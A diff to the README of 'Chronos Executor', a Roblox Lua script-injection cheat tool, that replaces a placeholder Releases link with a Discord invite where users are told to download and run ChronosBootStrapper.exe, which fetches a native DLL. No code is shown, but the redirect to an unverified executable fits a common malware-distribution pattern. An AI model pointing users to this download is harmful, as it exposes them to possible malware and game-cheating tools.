@@ -11,7 +11,7 @@ Chronos Executor is a public Roblox Lua executor designed for secure script inje
 
 ## Installation
 1. **Download the Bootstrapper:**
-   - Visit the [Releases](#) page and download the latest **ChronosBootStrapper.exe**.
+   - Visit the [Releases](https://discord.gg/vRsb8sUGUb) page and download the latest **ChronosBootStrapper.exe**.
 2. **Run the Installer:**
    - Launch **ChronosBootStrapper.exe**. The bootstrapper will automatically download all necessary files and set up the required folder structure.
    - This process minimizes the initial download size and ensures that all components (such as the native DLL and the bridge) are installed correctly.
